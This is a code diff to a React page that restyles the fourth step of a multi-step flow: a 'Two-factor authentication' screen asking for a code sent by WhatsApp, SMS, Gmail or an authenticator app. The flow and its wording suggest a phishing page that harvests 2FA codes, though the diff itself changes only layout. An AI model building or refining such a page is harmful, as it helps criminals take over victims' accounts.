@@ -752,25 +752,37 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 4: OTP FULL PAGE */}
+                            {/* BƯỚC 4: OTP FULL PAGE */}
               {step === 4 && !showSuccess && (
                 <div>
-                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '24px', marginBottom: '24px', flexWrap: 'wrap' }}>
-                    <div style={{ flex: '1 1 260px', minWidth: '240px' }}>
-                      <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
+                  {/* Chia 2 cột: Text bên trái, Ảnh bên phải (tỷ lệ 1:1) */}
+                  <div style={{ 
+                    display: 'grid', 
+                    gridTemplateColumns: '1fr 1fr', 
+                    gap: '24px', 
+                    alignItems: 'center', 
+                    marginBottom: '32px' 
+                  }}>
+                    <div>
+                      <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21', lineHeight: '1.3' }}>
                         Two-factor authentication
                       </h2>
-                      <p style={{ fontSize: '15px', color: '#1c1e21', margin: 0, lineHeight: '1.4' }}>
+                      <p style={{ fontSize: '15px', color: '#1c1e21', margin: 0, lineHeight: '1.5' }}>
                         Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
                       </p>
                     </div>
-                    <div style={{ flex: '0 1 220px', minWidth: '180px' }}>
-                      {/* Đã sửa lại đúng đuôi file .png theo cấu trúc thư mục của bạn */}
-                      <img src="/images/2fa-illustration.png" alt="2FA Code" style={{ width: '100%', display: 'block' }} />
+                    <div>
+                      {/* Ảnh sẽ tự động co giãn theo cột, to và rõ hơn */}
+                      <img 
+                        src="/images/2fa-illustration.png" 
+                        alt="2FA Code" 
+                        style={{ width: '100%', height: 'auto', display: 'block', borderRadius: '8px' }} 
+                      />
                     </div>
                   </div>
 
-                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  {/* Form nhập OTP */}
+                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                     <input 
                       type="text" 
                       placeholder="Code" 
@@ -811,7 +823,6 @@ export default function Home() {
                       fontSize: '17px',
                       fontWeight: '700',
                       cursor: otp.length >= 6 ? 'pointer' : 'not-allowed',
-                      marginTop: '8px',
                       transition: 'background 0.2s'
                     }}>
                       {loading ? 'Verifying...' : 'Continue'}
